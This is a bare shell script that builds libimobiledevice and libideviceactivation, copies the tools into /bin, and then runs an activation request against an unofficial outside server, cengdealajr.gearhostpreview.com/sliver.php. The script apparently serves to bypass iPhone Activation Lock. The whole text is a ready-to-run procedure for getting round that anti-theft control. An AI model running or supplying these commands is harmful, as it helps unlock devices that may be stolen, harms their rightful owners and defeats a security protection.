apt update && apt install -y usbmuxd libimobiledevice6 libimobiledevice-utils libavahi-compat-libdnssd-dev curl wget procps usbutils lsof tmux build-essential pkg-config checkinstall git autoconf automake libtool-bin libplist-dev libimobiledevice-dev libxml2-dev libcurl4-openssl-dev usbmuxd
git clone https://github.com/libimobiledevice/libideviceactivation.git
cd libideviceactivation
./autogen.sh
make
make install
cp tools/ideviceactivation/*.* /bin
ldconfig -v |& grep mobile
echo 'ls /bin >> /home/lsbin.txt'
ideviceactivation activate -s cengdealajr.gearhostpreview.com/sliver.php -d
